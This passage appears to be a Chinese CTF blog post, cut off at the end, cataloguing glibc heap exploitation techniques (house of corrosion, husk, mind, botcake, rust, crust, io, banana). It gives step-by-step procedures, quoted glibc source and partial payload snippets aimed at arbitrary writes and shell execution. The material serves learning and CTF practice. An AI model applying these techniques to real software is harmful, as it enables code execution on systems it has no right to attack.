<li><p>此时free掉事先分配好的chunkA，目标地址会指向A<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218153144362.png" alt="image-20250218153144362" style="zoom:50%;" /></p>
</li>
<li><p>通过UAF修改A的fd为value，*A&#x3D;value<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218153228419.png" alt="image-20250218153228419" style="zoom: 50%;" /></p>
</li>
<li><p>之后再分配回来，value也就成功写入对应的target_addr</p>
<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218153328675.png" alt="image-20250218153328675" style="zoom:50%;" /></li>
</ul>
<p><strong>原语2：</strong>（转移已经存在的值）</p>
<ul>
<li>首先假设目标地址为0x2000，0x3000上存有一个libc地址，fastbinY的地址为0x1000，计算<code>size1=(0x2000-0x1000)*2+0x20=0x2020</code>，<code>size2=(0x3000-0x1000)*2+0x20=0x4020</code></li>
<li>此时分配两个size都为size1的chunkA和chunkB，并且通过unsortedbin attack或者largebin attack改写global_max_fast</li>
<li>之后释放掉chunkA和chunkB<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218154308999.png" alt="image-20250218154308999" style="zoom:50%;" /></li>
<li>通过UAF，部分写chunkA的fd使其指向本身，达到double free类似的效果<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218154357013.png" alt="image-20250218154357013" style="zoom:50%;" /></li>
<li>再把A给分配回来，同时篡改chunkA的size为size2，释放掉A<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218154440828.png" alt="image-20250218154440828" style="zoom:50%;" /></li>
<li>再次篡改A的size,恢复为size1，然后malloc(size1),就成功完成src-&gt;dst数据的转移</li>
</ul>
<h3 id="相关技巧-8"><a href="#相关技巧-8" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li>虽然至今都能使用 <code>house of corrosion</code>，但是在 <code>glibc-2.37</code> 版本中，<code>global_max_fast</code> 的数据类型被修改为了 <code>int8_u</code>，进而导致可控的空间范围大幅度缩小。</li>
<li><code>house of corrosion</code> 也可以拓展到 <code>tcachebin</code> 上</li>
<li>适当控制 <code>global_max_fast</code> 的大小，把握控制的空间范围</li>
<li>可以和 <code>IO_FILE</code> 结合起来泄露信息</li>
</ul>
<h3 id="利用效果-8"><a href="#利用效果-8" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li><code>glibc</code> 上的地址泄露</li>
<li>执行 <code>one_gadget</code></li>
</ul>
<h2 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h2><h3 id="漏洞成因-9"><a href="#漏洞成因-9" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p>
<h3 id="适用范围-9"><a href="#适用范围-9" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>2.23–2.35</li>
<li>劫持 <code>__printf_function_table</code> 使其不为空，劫持 <code>__printf_arginfo_table</code> 使其表中存放的 <code>spec</code> 的位置是 <code>backdoor()</code>，执行到 <code>printf</code> 函数时就可以将执行流劫持到 <code>backdoor()</code></li>
<li>可触发格式化字符串解析</li>
</ul>
<blockquote>
<p>简单来说printf对自定义的格式化字符串的处理优先于默认的格式化字符串处理，我们通过篡改<code>__printf_function_table</code>来使程序认为存在注册过的自定义格式化字符串，从而触发<code>__printf_arginfo_table</code>上的函数指针</p>
</blockquote>
<h3 id="利用原理-9"><a href="#利用原理-9" class="headerlink" title="利用原理"></a>利用原理</h3><p>调用处 <code>1</code>：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line">  <span class="comment">/* Use the slow path in case any printf handler is registered.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">goto</span> do_positional;</span><br><span class="line"></span><br><span class="line"><span class="comment">// vfprintf-internal.c#1763</span></span><br><span class="line">nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line"></span><br><span class="line"><span class="comment">// printf-parsemb.c (__parse_one_specmb函数)</span></span><br><span class="line"><span class="comment">/* Get the format specification.  */</span></span><br><span class="line">spec-&gt;info.spec = (<span class="type">wchar_t</span>) *format++;</span><br><span class="line">spec-&gt;size = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>) <span class="comment">// 判断是否为空</span></span><br><span class="line">  || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">  || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span> <span class="comment">// 判断是否为空</span></span><br><span class="line">  <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment"> uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment"> the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">  || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec]) <span class="comment">// 调用__printf_arginfo_table中的函数指针</span></span><br><span class="line">               (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">                &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用方式为：</p>
<ul>
<li><code>__printf_function_table</code> 和<code>__printf_arginfo_table</code> 分别写为 <code>chunk A</code> 和 <code>chunk B</code> 的地址</li>
<li>设占位符为 <code>α</code>，此时 <code>chunk B</code> 的内容应该为 <code>p64(0) x ord(α-2) + p64(one_gadget)</code></li>
</ul>
<p>调用处 <code>2</code>：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vfprintf-internal.c#1962</span></span><br><span class="line"><span class="keyword">if</span> (spec &lt;= UCHAR_MAX</span><br><span class="line">          &amp;&amp; __printf_function_table != <span class="literal">NULL</span></span><br><span class="line">          &amp;&amp; __printf_function_table[(<span class="type">size_t</span>) spec] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// ......</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Call the function.  */</span></span><br><span class="line">      function_done = __printf_function_table[(<span class="type">size_t</span>) spec](s, &amp;specs[nspecs_done].info, ptr); <span class="comment">// 调用__printf_function_table中的函数指针</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (function_done != <span class="number">-2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If an error occurred we don&#x27;t have information</span></span><br><span class="line"><span class="comment">         about # of chars.  */</span></span><br><span class="line">      <span class="keyword">if</span> (function_done &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Function has set errno.  */</span></span><br><span class="line">          done = <span class="number">-1</span>;</span><br><span class="line">          <span class="keyword">goto</span> all_done;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="built_in">done_add</span> (function_done);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用方式为：</p>
<ul>
<li><code>__printf_function_table</code> 和<code>__printf_arginfo_table</code> 分别写为 <code>chunk A</code> 和 <code>chunk B</code> 的地址</li>
<li>设占位符为 <code>α</code>，此时 <code>chunk A</code> 的内容应该为 <code>p64(0) x ord(α-2) + p64(one_gadget)</code></li>
</ul>
<p>该处调用在高版本被删除。</p>
<h3 id="相关技巧-9"><a href="#相关技巧-9" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li>该技巧一般和 <code>largebin attack</code> 结合起来</li>
<li>在低于 <code>2.36</code> 版本中，<code>__malloc_assert</code> 中有格式化字符串的解析</li>
<li>还有一个<code>__printf_va_arg_table</code> 也是可以利用的，但是条件比较苛刻</li>
</ul>
<h3 id="利用效果-9"><a href="#利用效果-9" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>执行 <code>one_gadget</code></li>
<li>执行 <code>rop</code> 控制程序执行流</li>
</ul>
<h2 id="house-of-kauri"><a href="#house-of-kauri" class="headerlink" title="house of kauri"></a>house of kauri</h2><h3 id="漏洞成因-10"><a href="#漏洞成因-10" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p>
<h3 id="适用范围-10"><a href="#适用范围-10" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.26</code>——<code>2.32</code></li>
</ul>
<h3 id="利用原理-10"><a href="#利用原理-10" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用原理很简单，修改 <code>tcachebin</code> 的 <code>size</code>，然后使其被放到不同大小的 <code>tcachebin</code> 链表里面去。我感觉这个技巧是很基础的 <code>tcachebin</code> 技巧，甚至不应该被称之为 <code>house of</code>。</p>
<h3 id="相关技巧-10"><a href="#相关技巧-10" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li>无</li>
</ul>
<h3 id="利用效果-10"><a href="#利用效果-10" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>多个 <code>tcachebin</code> 链表中存放同一个 <code>chunk</code></li>
</ul>
<h2 id="house-of-mind"><a href="#house-of-mind" class="headerlink" title="house of mind"></a>house of mind</h2><h3 id="漏洞成因-11"><a href="#漏洞成因-11" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出，<code>edit after free</code></p>
<h3 id="适用范围-11"><a href="#适用范围-11" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
<li>可以分配任意大小的 <code>chunk</code></li>
<li>程序在子线程执行malloc</li>
</ul>
<h3 id="利用原理-11"><a href="#利用原理-11" class="headerlink" title="利用原理"></a>利用原理</h3><ul>
<li><p>通过多线程或者特定的分配方式，创建一块非主arena的chunkA</p>
</li>
<li><p>然后通过chunkA的地址用</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="meta">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br></pre></td></tr></table></figure>

<p>该方式计算出<code>heap_for_ptr</code>的地址</p>
</li>
<li><p>在<code>heap_info_addr</code>处伪造mstate ar_ptr指针指向攻击者控制的伪造arena区域</p>
</li>
<li><p>之后修改chunkA的<code>non_main_arena</code>标志位为1</p>
</li>
<li><p>之后释放chunkA，此时arena_for_chunk(A)会通过伪造的<code>heap_info_addr-&gt;ar_ptr</code>找到伪造的arena区域</p>
</li>
<li><p>而伪造的arena区域 可以 控制 fastbin 链表头，实现<strong>任意地址分配</strong>，以此实现任意地址写</p>
</li>
</ul>
<h3 id="相关技巧-11"><a href="#相关技巧-11" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li>一般来说，可以分配任意大小的 <code>chunk</code>，还能堆溢出，很多技巧都能用</li>
<li>这个技巧是希望大家关注对于 <code>arena</code> 的攻击</li>
<li>甚至可以直接修改 <code>thread_arena</code> 这个变量</li>
</ul>
<h3 id="利用效果-11"><a href="#利用效果-11" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意地址写任意值</li>
</ul>
<h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h2><h3 id="漏洞成因-12"><a href="#漏洞成因-12" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p><code>double free</code></p>
<h3 id="适用范围-12"><a href="#适用范围-12" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.26</code>—— 至今</li>
<li>多次释放 <code>chunk</code> 的能力</li>
</ul>
<h3 id="利用原理-12"><a href="#利用原理-12" class="headerlink" title="利用原理"></a>利用原理</h3><p>该技巧可以用于绕过 <code>tcache-&gt;key</code> 的检查，利用过程如下：</p>
<ul>
<li>申请7个大于size大于0x80的chunk，然后再申请3个，分别为chunkA，chunkB，chunkC（chunkC只是用来隔断<code>top chunk</code>）</li>
<li>释放前7个chunk进入tcache，之后释放chunkB进入unsortedbin，然后释放chunkA与chunkB合并</li>
<li>之后从tcache中分配一个chunk</li>
<li>然后再次释放chunkB，使得chunkB进入tcache，此时chunkB就既位于unsortedbin也位于tcache中</li>
<li>之后再次申请一个chunk，就得到了chunkB，但是此时的chunkB还位于unsortedbin</li>
</ul>
<h3 id="相关技巧-12"><a href="#相关技巧-12" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li>在高版本需要绕过指针保护的检查</li>
</ul>
<h3 id="利用效果-12"><a href="#利用效果-12" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>构造出<strong>堆重叠</strong>，为后续利用做准备</li>
</ul>
<h2 id="house-of-rust"><a href="#house-of-rust" class="headerlink" title="house of rust"></a>house of rust</h2><h3 id="漏洞成因-13"><a href="#漏洞成因-13" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p>
<h3 id="适用范围-13"><a href="#适用范围-13" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.26</code>——至今</li>
<li>可以进行<code>tcache stash unlinking</code>攻击</li>
<li>可以进行<code>largebin attack</code></li>
<li>不需要泄露地址</li>
</ul>
<h3 id="利用原理-13"><a href="#利用原理-13" class="headerlink" title="利用原理"></a>利用原理</h3><p><strong>前置知识</strong></p>
<p>首先需要知道<code>tcachebin stash unlinking</code>，下面称之为<code>TSU</code>技巧：</p>
<ul>
<li><code>tcachebin[A]</code>为空</li>
<li><code>smallbin[A]</code>有<code>8</code>个</li>
<li>修改第<code>8</code>个<code>smallbin chunk</code>的<code>bk</code>为<code>addr</code></li>
<li>分配<code>malloc(A)</code>的时候，<code>addr+0x10</code>会被写一个<code>libc</code>地址</li>
</ul>
<p>还要知道<code>tcachebin stash unlinking+</code>，下面称之为<code>TSU+</code>技巧：</p>
<ul>
<li><code>tcachebin[A]</code>为空</li>
<li><code>smallbin[A]</code>有<code>8</code>个</li>
<li>修改第<code>7</code>个<code>smallbin chunk</code>的<code>bk</code>为<code>addr</code>，还要保证<code>*(addr+0x18)</code>是一个合法可写的地址</li>
<li>分配<code>malloc(A)</code>的时候，<code>addr</code>会被链入到<code>tcachebin</code>，也就是可以分配到<code>addr</code>处</li>
</ul>
<p><strong>第一阶段：堆风水布局（Heap Feng Shui）</strong></p>
<ul>
<li>首先先分配14个0x90的chunk(编号1-14)，然后再接替释放到tcache和smallbin中（1\3\5\7\9\11\13释放到tcahce….）</li>
<li>之后通过分配大chunk将unsortedbin中的都放入smallbin</li>
</ul>
<p><strong>第二阶段：Tcache Stashing Unlink+ 结合 Largebin 攻击</strong></p>
<ul>
<li>然后通过WAF修改chunk14的size片段为0xB0，之后再次释放chunk14到tcahce[0xB0]中，此时他的bk就是tcahce_key，也就是<code>&amp;tcahce_perthread_struct+0x10</code>，但是同时也造成了smallbin链的破坏</li>
<li>再次修改chunk14的bk的最低字节为0x80，指向<code>tcache_perthread_struct + 0x80 - 0x18</code>（0x30 tcache头部附近）</li>
<li>之后通过largebin attack修改chunk14的fd以修复smallbin链</li>
<li>清空tcahe然后再次分配0x90块，触发Tcache Stashing Unlink+机制，使得0x90 tcache头部指向<code>tcache_perthread_struct + 0x80</code></li>
</ul>
<p><strong>第三阶段：Tcache Stashing Unlink 结合二次Largebin攻击</strong></p>
<ul>
<li>分配15个0xa0的块</li>
<li>通过将<code>Tcache Stashing Unlink</code>将libc地址写入<code>tcache_perthread_struct</code></li>
</ul>
<p><strong>第四阶段：stdout FSOP泄露libc</strong></p>
<ul>
<li>利用第三阶段写入的libc地址，部分写，多次爆破，即可将chunk分配到<code>_IO_2_1_stdout_</code>结构</li>
<li>之后通过结构体复写即可触发libc泄露，泄露完就简单多了</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line">payload=p64(_flags)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br></pre></td></tr></table></figure>

<p><strong>第五阶段：最终Shell获取</strong></p>
<ul>
<li><code>__free_hook</code>写system或者onegadget都是可以的</li>
</ul>
<p>上面的过程最好的情况下需要爆破<code>1/16</code>，最差<code>1/256</code>。</p>
<p><strong>但是</strong>，<code>2.34</code>之后，<code>tcache_key</code>是一个随机数，不是<code>tcache_perthread_struct + 0x10</code>了。</p>
<p>所以，此时可以加上<code>largebin attack</code>，把以上的第二步变为：继续用<code>largebin attack</code>向其<code>bk</code>写一个堆地址，然后还要部分写<code>bk</code>使其落在<code>tcache_perthread_struct</code>区域。其他步骤一样。</p>
<p>或者，在<code>smallbin</code>里面放<code>9</code>个，这样第<code>8</code>个的<code>bk</code>肯定就是一个堆地址。此时就需要爆破<code>1/16</code>的堆，<code>1/16</code>的<code>glibc</code>地址，成功的概率是<code>1/256</code>。</p>
<h3 id="相关技巧-13"><a href="#相关技巧-13" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li>总的来说，就是利用<code>tcachebin stash unlinking</code>打<code>tcache_perthread_struct</code></li>
<li>利用<code>largebin attack</code>构造合法地址</li>
</ul>
<h3 id="利用效果-13"><a href="#利用效果-13" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意地址分配</li>
<li>任意函数执行</li>
</ul>
<h2 id="house-of-crust"><a href="#house-of-crust" class="headerlink" title="house of crust"></a>house of crust</h2><h3 id="漏洞成因-14"><a href="#漏洞成因-14" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p>
<h3 id="适用范围-14"><a href="#适用范围-14" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.26</code>——<code>2.37</code></li>
<li>可以进行<code>tcache stash unlinking</code>攻击</li>
<li>可以进行<code>largebin attack</code></li>
<li>不需要泄露地址</li>
</ul>
<h3 id="利用原理-14"><a href="#利用原理-14" class="headerlink" title="利用原理"></a>利用原理</h3><p>其他步骤和上面的<code>house of rust</code>一样，但是到第五步的时候，去修改<code>global_max_fast</code></p>
<p>后面的步骤和<code>house of corrosion</code>是一样的，通过写原语打<code>stderr</code>修改<code>one_gadget</code>拿到<code>shell</code>。</p>
<h3 id="相关技巧-14"><a href="#相关技巧-14" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li><code>house of crust = house of corrosion + house of rust</code></li>
<li><code>2.37</code>之后，<code>house of corrosion</code>使用受限</li>
</ul>
<h2 id="house-of-io"><a href="#house-of-io" class="headerlink" title="house of io"></a>house of io</h2><h3 id="漏洞成因-15"><a href="#漏洞成因-15" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p>
<h3 id="适用范围-15"><a href="#适用范围-15" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.26</code>—— 至今</li>
</ul>
<h3 id="利用原理-15"><a href="#利用原理-15" class="headerlink" title="利用原理"></a>利用原理</h3><p>其他博客上对该方法的介绍如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The tcache_perthread_object is allocated when the heap is created. Furthermore, it is stored right at the heap&#x27;s beginning (at a relatively low memory address). The safe-linking mitigation aims to protect the fd/next pointer within the free lists. However, the head of each free-list is not protected. Additionally, freeing a chunk and placing it into the tcachebin also places a non-protected pointer to the appropriate tcache entry in the 2nd qword of a chunks&#x27; user data. The House of IO assumes one of three scenarios for the bypass to work. First, any attacker with a controlled linear buffer underflow over a heap buffer, or a relative arbitrary write will be able to corrupt the tcache. Secondly, a UAF bug allowing to read from a freed tcache eligible chunk leaks the tcache and with that, the heap base. Thirdly, a badly ordered set of calls to free(), ultimately passing the address of the tcache itself to free, would link the tcache into the 0x290 sized tcachebin. Allocating it as a new chunk would mean complete control over the tcache&#x27;s values.</span><br></pre></td></tr></table></figure>

<p>可以看出来，其实就是对 <code>tcache_perthread_struct</code> 结构体的攻击，想办法将其释放掉，然后再申请回来，申请回来的时候就能控制整个 <code>tcache</code> 的分配。</p>
<h3 id="相关技巧-15"><a href="#相关技巧-15" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li>围绕 <code>tcache_perthread_struct</code> 进行攻击</li>
</ul>
<h3 id="利用效果-14"><a href="#利用效果-14" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意地址分配</li>
</ul>
<h2 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h2><h3 id="漏洞成因-16"><a href="#漏洞成因-16" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p>
<h3 id="适用范围-16"><a href="#适用范围-16" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
<li>可以进行 <code>largebin attack</code></li>
<li>能执行 <code>exit</code> 函数</li>
</ul>
<h3 id="利用原理-16"><a href="#利用原理-16" class="headerlink" title="利用原理"></a>利用原理</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *l = maps[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">        l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">            || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (<span class="built_in">GLRO</span>(dl_debug_mask)</span><br><span class="line">                                  &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">                _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">                                  <span class="built_in">DSO_FILENAME</span> (l-&gt;l_name),</span><br><span class="line">                                  ns);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">            <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">ElfW</span>(Addr) *array =</span><br><span class="line">                    (<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr</span><br><span class="line">                                    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                                  / <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">                <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">                    ((<span class="type">fini_t</span>) array[i]) ();  <span class="comment">//调用函数</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">            <span class="keyword">if</span> (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                <span class="built_in">DL_CALL_DT_FINI</span></span><br><span class="line">                (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">        <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">        _dl_audit_objclose (l);</span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">    --l-&gt;l_direct_opencount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ElfW</span>(Addr) *array =</span><br><span class="line">    (<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr</span><br><span class="line">                    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);<span class="comment">//DT_FINI_ARRAY=26 d_un.d_ptr偏移为8</span></span><br></pre></td></tr></table></figure>

<p>也就是我们将<code>l-&gt;l_info[26]</code>写入<code>l_info[26]</code>的地址，<code>array</code>的值就是<code>l_info[27]</code>中存放的值</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                  / <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr))); <span class="comment">//DT_FINI_ARRAYSZ=28，还是偏移8</span></span><br></pre></td></tr></table></figure>

<p>也就是说我们在<code>l_info[28]</code>写入<code>l_info[28]</code>的地址，<code>i</code>的值就是<code>l_info[29]中存放的值/8</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    ((<span class="type">fini_t</span>) array[i]) ();  <span class="comment">//调用函数</span></span><br></pre></td></tr></table></figure>

<p>最后会执行<code>array[i]-&gt;array[0]</code>，从i到0调用</p>
<p><strong>2.31打orw：</strong></p>
<ul>
<li><p>通过largebin attack伪造<code>_rtld_global</code>的<code>link_map</code>地址</p>
</li>
<li><p>然后布局link_map打orw</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">link_map=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(libc_base+<span class="number">0x223740</span>)<span class="comment">#l_next</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>+<span class="number">0x40</span>)<span class="comment">#l_real</span></span><br><span class="line">link_map+=p64(<span 